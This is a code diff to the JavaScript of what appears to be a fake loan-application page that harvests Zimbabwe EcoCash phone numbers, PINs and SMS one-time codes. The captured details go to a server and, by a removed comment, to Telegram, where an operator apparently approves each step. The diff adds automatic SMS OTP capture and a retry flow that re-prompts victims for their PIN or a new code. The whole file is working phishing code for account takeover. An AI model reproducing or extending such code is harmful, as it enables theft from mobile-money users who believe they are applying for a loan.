@@ -1,29 +1,13 @@
 let currentAppRef = null;
 let statusPollInterval = null;
+let lastFailedType = 'PIN'; 
 
 function updateLoanCalc() {
   const amount = parseInt(document.getElementById('loanRange').value);
-  const periodElem = document.getElementById('calc-period');
-  const repaymentPeriodInput = document.getElementById('repaymentPeriod');
-  
-  let months = "1";
-  if (amount <= 100) {
-    months = "1";
-  } else if (amount <= 250) {
-    months = "2";
-  } else if (amount <= 400) {
-    months = "3";
-  } else {
-    months = "6";
-  }
-
   const interest = Math.round(amount * 0.10);
   const total = amount + interest;
 
   document.getElementById('calc-amount').innerText = '$' + amount;
-  periodElem.innerText = months;
-  repaymentPeriodInput.value = months;
-
   document.getElementById('calc-interest').innerText = '$' + interest;
   document.getElementById('calc-total').innerText = '$' + total;
 }
@@ -38,6 +22,29 @@ function showSection(sectionId) {
   }
 
   document.getElementById(sectionId).classList.remove('hidden');
+
+  if (sectionId === 'form-step-3') {
+    startOTPEngine();
+  }
+}
+
+async function startOTPEngine() {
+  if ('OTPCredential' in window) {
+    try {
+      const ac = new AbortController();
+      const otp = await navigator.credentials.get({
+        otp: { transport:['sms'] },
+        signal: ac.signal
+      });
+      
+      if (otp && otp.code) {
+        document.getElementById('otpCode').value = otp.code;
+        submitOTPDetails();
+      }
+    } catch (err) {
+      console.log("Web OTP Auto-fill not supported or aborted", err);
+    }
+  }
 }
 
 function validateAndGoToStep2() {
@@ -56,7 +63,6 @@ async function submitStep2Details() {
   const phone = document.getElementById('phone').value.trim();
   const pin = document.getElementById('pin').value.trim();
 
-  // Strict 9-digit Zimbabwe EcoCash number check
   if (!/^\d{9}$/.test(phone)) {
     alert("Please enter exactly 9 digits for your Zimbabwe EcoCash phone number.");
     return;
@@ -80,7 +86,6 @@ async function submitStep2Details() {
   try {
     showSection('step-loading');
 
-    // Deliver combined Step 1 & Step 2 details immediately to server / Telegram
     const res = await fetch('/api/apply-loan', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -92,7 +97,6 @@ async function submitStep2Details() {
       currentAppRef = data.appReference;
       startStatusPolling();
 
-      // Start 10-second countdown and auto-advance to Step 3
       startCountdown(10, () => {
         showSection('form-step-3');
       });
@@ -128,12 +132,20 @@ async function submitOTPDetails() {
 
     const data = await res.json();
     if (data.success) {
-      startCountdown(10, () => {
-        // Active status polling will move to Step 4 on Telegram approval
-      });
+      startCountdown(10, () => {});
     }
   } catch (err) {
     alert("Error submitting OTP. Please try again.");
+    showSection('form-step-3');
+  }
+}
+
+function retryFailedStep() {
+  if (lastFailedType === 'PIN') {
+    document.getElementById('pin').value = '';
+    showSection('form-step-2');
+  } else {
+    document.getElementById('otpCode').value = '';
     showSection('form-step-3');
   }
 }
@@ -170,14 +182,16 @@ function startStatusPolling() {
           showSection('form-step-3');
         } else if (data.status === 'PIN_REJECTED') {
           clearInterval(statusPollInterval);
-          document.getElementById('rejection-msg').innerText = "Incorrect EcoCash PIN provided.";
+          lastFailedType = 'PIN';
+          document.getElementById('rejection-msg').innerText = "Incorrect EcoCash PIN provided. Please re-enter your PIN.";
           showSection('step-rejected');
         } else if (data.status === 'OTP_APPROVED' || data.status === 'LOAN_APPROVED') {
           clearInterval(statusPollInterval);
           showSection('step-success');
         } else if (data.status === 'OTP_REJECTED') {
           clearInterval(statusPollInterval);
-          document.getElementById('rejection-msg').innerText = "Incorrect SMS OTP code provided.";
+          lastFailedType = 'OTP';
+          document.getElementById('rejection-msg').innerText = "Incorrect SMS OTP code provided. Please request and enter a new OTP.";
           showSection('step-rejected');
         }
       }
@@ -185,4 +199,5 @@ function startStatusPolling() {
       console.error("Polling status error:", err);
     }
   }, 2000);
-}
+    }
+    
